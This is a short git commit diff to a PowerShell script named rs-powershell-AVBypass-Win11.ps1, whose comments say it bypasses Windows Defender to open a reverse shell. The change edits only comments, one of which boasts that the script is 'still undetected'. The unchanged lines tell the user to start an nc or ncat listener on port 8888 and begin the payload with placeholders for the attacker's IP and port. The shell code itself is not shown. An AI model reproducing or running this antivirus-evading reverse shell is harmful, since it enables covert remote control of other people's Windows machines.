efefee1ee4fb103a5b3115a2fe1dd0a3caa6cc2d
Exploit and Chill <wackerboo@hotmail.com>
2025-06-16 12:57:59 -0700

    Update rs-powershell-AVBypass-Win11.ps1

--- rs-powershell-AVBypass-Win11.ps1
+++ rs-powershell-AVBypass-Win11.ps1
@@ -1,6 +1,7 @@
 #script will bypass defender - run in powershell and update port/IP to receive reverse shell. 
 #on your listener run nc -lv 8888 (for MacOS) or if on windows ncat -lvnp 8888 
-#CarsoRemember to update port #number to match port set in script)
+#Remember to update port #number to match port set in script)
+#Virtually no obfuscation - still undetected! 
 
 
 $h='{change to your IP}';$p={change to your port}
